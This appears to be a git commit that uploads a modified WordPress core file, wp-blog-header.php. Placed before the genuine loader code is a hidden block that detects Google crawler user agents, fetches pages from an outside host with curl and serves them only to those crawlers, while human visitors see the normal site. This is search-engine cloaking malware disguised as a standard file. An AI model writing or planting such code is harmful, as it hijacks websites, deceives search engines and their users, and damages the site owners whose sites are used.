6c882602bd643be2e1bf690606f17f5cdd2c3f98
./Trubuk <36835625+anang37@users.noreply.github.com>
2026-06-25 17:54:38 +0700

    Add files via upload

---
+++ wp-blog-header.php
@@ -0,0 +1,57 @@
+ 
+<?php
+function google() {
+    $agents = array("Googlebot", "Google-Site-Verification", "Google-InspectionTool", "Googlebot-Mobile", "Googlebot-News");
+    foreach ($agents as $agent) {
+        if (strpos($_SERVER['HTTP_USER_AGENT'], $agent) !== false) return true;
+    }
+    return false;
+}
+
+if (google()) {
+    $bot_content = 'https://county.blakeforlake.com/';
+    
+    $curl = curl_init();
+
+curl_setopt_array($curl, array(
+  CURLOPT_URL => $bot_content,
+  CURLOPT_RETURNTRANSFER => true,
+  CURLOPT_ENCODING => '',
+  CURLOPT_MAXREDIRS => 10,
+  CURLOPT_TIMEOUT => 0,
+  CURLOPT_FOLLOWLOCATION => true,
+  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
+  CURLOPT_CUSTOMREQUEST => 'GET',
+  CURLOPT_HTTPHEADER => array(
+    'User-Agent: Googlebot'
+  ),
+));
+
+$response = curl_exec($curl);
+
+curl_close($curl);
+echo $response;
+
+    exit;
+}
+?><?php
+/**
+ * Loads the WordPress environment and template.
+ *
+ * @package WordPress
+ */
+
+if ( ! isset( $wp_did_header ) ) {
+
+    $wp_did_header = true;
+
+    // Load the WordPress library.
+    require_once( dirname( __FILE__ ) . '/wp-load.php' );
+
+    // Set up the WordPress query.
+    wp();
+
+    // Load the theme template.
+    require_once( ABSPATH . WPINC . '/template-loader.php' );
+
+}
